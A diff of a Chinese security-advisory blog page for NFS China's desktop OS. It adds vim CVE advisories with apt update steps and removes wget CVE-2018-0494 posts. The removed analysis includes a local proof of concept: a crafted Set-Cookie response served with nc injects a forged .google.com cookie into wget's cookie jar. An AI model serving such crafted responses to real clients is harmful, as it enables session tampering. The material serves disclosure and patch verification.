+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim的win_linetabsize()函数中存在一个释放后使用漏洞，攻击者可以使用特制的文件造成崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2021-4192"><a href="#漏洞编号：-CVE-2021-4192" class="headerlink" title="漏洞编号： CVE-2021-4192"></a>漏洞编号： CVE-2021-4192</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-4192">https://nvd.nist.gov/vuln/detail/CVE-2021-4192</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2019-5953%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysy0007b214atp58fcw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2021-4192%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp0v00136x149ngx2f4o" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -398,10 +519,10 @@
 
 
   
-    <article id="post-cve-2018-0494" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2022-0714安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2018-0494/" class="article-date">
-  <time datetime="2022-03-09T08:10:45.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/03/23/CVE-2022-0714%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T08:47:49.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -412,7 +533,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2018-0494/">cve-2018-0494</a>
+      <a class="article-title" href="/2022/03/23/CVE-2022-0714%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0714安全公告</a>
     </h1>
   
 
@@ -420,19 +541,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>GNU Wget before 1.19.5 is prone to a cookie injection vulnerability in the resp_new function in http.c via a \r\n sequence in a continuation line.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2018-0494"><a href="#漏洞编号：-CVE-2018-0494" class="headerlink" title="漏洞编号： CVE-2018-0494"></a>漏洞编号： CVE-2018-0494</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：6-5"><a href="#CVSS3-1评分：6-5" class="headerlink" title="CVSS3.1评分：6.5"></a>CVSS3.1评分：6.5</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-0494">https://nvd.nist.gov/vuln/detail/CVE-2018-0494</a></p>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim存在堆缓冲区漏洞，此漏洞是由于“vartabstop”值不正确造成的，该漏洞允许攻击者诱骗用户打开精心编制的文件，从而触发堆溢出，并可能导致应用程序崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2022-0714"><a href="#漏洞编号：-CVE-2022-0714" class="headerlink" title="漏洞编号： CVE-2022-0714"></a>漏洞编号： CVE-2022-0714</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：5-5"><a href="#CVSS3-1评分：5-5" class="headerlink" title="CVSS3.1评分：5.5"></a>CVSS3.1评分：5.5</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0714">https://nvd.nist.gov/vuln/detail/CVE-2022-0714</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2018-0494/" data-id="cl11k4ysv0003b2140nkd5cwe" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2022-0714%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp15001k6x1490jx1ugo" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -440,10 +583,10 @@
 
 
   
-    <article id="post-cve-2018-0494分析" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2021-4069安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2018-0494%E5%88%86%E6%9E%90/" class="article-date">
-  <time datetime="2022-03-09T06:16:09.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/03/23/CVE-2021-4069%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T08:25:09.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -454,7 +597,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2018-0494%E5%88%86%E6%9E%90/">cve-2018-0494分析</a>
+      <a class="article-title" href="/2022/03/23/CVE-2021-4069%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2021-4069安全公告</a>
     </h1>
   
 
@@ -462,32 +605,105 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="cve编号"><a href="#cve编号" class="headerlink" title="cve编号"></a>cve编号</h3><p>CVE-2018-0494</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>NFS-SA-202203-0001</p>
-<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>老版本wget的http.c中，set-cookie代码没有对 \n 和 \r做检查，可以被恶意网站将\r\n 写入到cookie jar中，在使用wget进行下载时 随意生成cookie。</p>
-<h3 id="复现方法"><a href="#复现方法" class="headerlink" title="复现方法"></a>复现方法</h3><p>先设置一个小型网络服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~/poc/fix$ echo -ne &#x27;HTTP/1.1 200 OK\r\nContent-Length: 0\r\nSet-Cookie: foo=&quot;bar\r\n\x20.google.com\tTRUE\t/\tFALSE\t1900000000\tinjected\tcookie\r\n\t&quot;;expires=Thursday, 01-Jan-2032 08:00:00 GMT\r\n\r\n&#x27; | nc -v -l 7777</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 7777)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim存在缺陷。攻击者可以通过脚本模式-s{scriptin}让用户执行任意文件。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2021-4069"><a href="#漏洞编号：-CVE-2021-4069" class="headerlink" title="漏洞编号： CVE-2021-4069"></a>漏洞编号： CVE-2021-4069</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
 
-<p> 使用wget获取恶意网址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~$ wget --save-cookies jar.txt http://127.0.0.1:7777/plop</span><br><span class="line">--2022-03-09 15:00:09--  http://127.0.0.1:7777/plop</span><br><span class="line">正在连接 127.0.0.1:7777... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：0</span><br><span class="line">正在保存至: “plop.1”</span><br><span class="line"></span><br><span class="line">plop.1                  [ &lt;=&gt;                ]       0  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line">2022-03-09 15:00:09 (0.00 B/s) - 已保存 “plop” [0/0])</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
 
-<p>有漏洞的wget执行后，获取到的jar.txt内容为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~$ cat jar.txt</span><br><span class="line"># HTTP cookie file.</span><br><span class="line"># Generated by Wget on 2022-03-09 15:01:53.</span><br><span class="line"># Edit at your own risk.</span><br><span class="line"></span><br><span class="line">127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	&quot;bar</span><br><span class="line"> .google.com	TRUE	/	FALSE	1900000000	injected	cookie</span><br><span class="line">	&quot;</span><br><span class="line">wky@wky-virtual-machine:~$</span><br></pre></td></tr></table></figure>
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
 
-<p>修复漏洞之后的结果为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~$ cat jar.txt</span><br><span class="line"># HTTP cookie file.</span><br><span class="line"># Generated by Wget on 2022-03-09 15:00:09.</span><br><span class="line"># Edit at your own risk.</span><br><span class="line"></span><br><span class="line">127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	&quot;bar   .google.com	TRUE	/	FALSE	1900000000	injected	cookie  	&quot;</span><br><span class="line">wky@wky-virtual-machine:~$</span><br></pre></td></tr></table></figure>
-
-<p>可以看到修复之后，获取的cookie为一行，而存在漏洞的wget获取的cookie被恶意网址修改成为了两行。</p>
-<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>将wget升级到 wget_1.18-5+deb9u3版本即可。</p>
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-4069">https://nvd.nist.gov/vuln/detail/CVE-2021-4069</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2018-0494%E5%88%86%E6%9E%90/" data-id="cl0j9vkt80000lq14g58519y6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2021-4069%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp0v00116x14546nau0d" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li></ul>
+    </footer>
+  </div>
+  
+</article>
 
+
+  
+    <article id="post-CVE-2022-0685安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/03/23/CVE-2022-0685%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T08:18:30.000Z" itemprop="datePublished">2022-03-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/23/CVE-2022-0685%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0685安全公告</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim存在缺陷。该漏洞是由于使用特殊的多字节字符时发生崩溃而导致。该漏洞会被攻击者利用导致崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2022-0685"><a href="#漏洞编号：-CVE-2022-0685" class="headerlink" title="漏洞编号： CVE-2022-0685"></a>漏洞编号： CVE-2022-0685</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0685">https://nvd.nist.gov/vuln/detail/CVE-2022-0685</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2022-0685%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp13001j6x1488qz9rce" class="article-share-link">Share</a>
+      
+      
     </footer>
   </div>
   
@@ -498,7 +714,7 @@
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">__(&#39;next&#39;) &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">__(&#39;next&#39;) &amp;raquo;</a>
   </nav>
 </section>
         
@@ -511,7 +727,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/" rel="tag">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" rel="tag">c demo使用说明</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit/" rel="tag">cockpit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit-DBus-Client/" rel="tag">cockpit.DBus Client</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit-js/" rel="tag">cockpit.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" rel="tag">cockpit数据格式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" rel="tag">cockpit文件操作</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/configobj/" rel="tag">configobj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dbus/" rel="tag">dbus</a></li><li class="tag-list-item"><a class="tag-list-link" 